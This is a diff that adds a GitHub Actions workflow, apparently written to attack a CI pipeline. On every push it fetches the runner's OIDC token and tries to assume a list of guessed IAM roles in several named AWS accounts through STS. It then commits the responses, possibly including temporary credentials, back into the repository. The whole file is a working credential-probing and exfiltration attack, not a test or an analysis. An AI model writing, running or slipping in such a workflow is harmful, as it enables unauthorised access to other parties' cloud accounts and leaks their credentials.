@@ -1,0 +1,37 @@
+name: aws-probe
+on:
+  workflow_dispatch:
+  push:
+    branches: ["**"]
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  awsprobe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: run
+        run: |
+          exec > aws_probe_results.txt 2>&1
+          AWS_AUD="sts.amazonaws.com"
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AWS_AUD" | jq -r .value)
+          echo "AWS_OIDC_TOKEN_PAYLOAD:"
+          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          ACCT="851725545228"
+          for ROLE in GitHubBuilder GitHubBuilderRole GitHubActions github-actions github-actions-role deploy deploy-role CICD ci-cd BuildRole builder replicate-poweruser OrganizationAccountAccessRole admin Admin role/GitHubBuilder; do
+            echo "============================== ROLE=$ROLE =============================="
+            curl -sS "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::$ACCT:role/$ROLE&RoleSessionName=probe&WebIdentityToken=$TOK" | head -c 800
+            echo
+          done
+          echo "=== also try other likely AWS accounts ==="
+          for A in 851725545228 230394422516 905418297001 123456789012; do
+            echo "-- acct $A role GitHubBuilder --"
+            curl -sS "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::$A:role/GitHubBuilder&RoleSessionName=probe&WebIdentityToken=$TOK" | head -c 500
+            echo
+          done
+          echo DONE_${GITHUB_REF}
+      - name: push
+        run: |
+          git config user.email "probe@example.com"; git config user.name "probe"
+          git add aws_probe_results.txt; git commit -m "aws probe [skip ci]" || true; git push || true
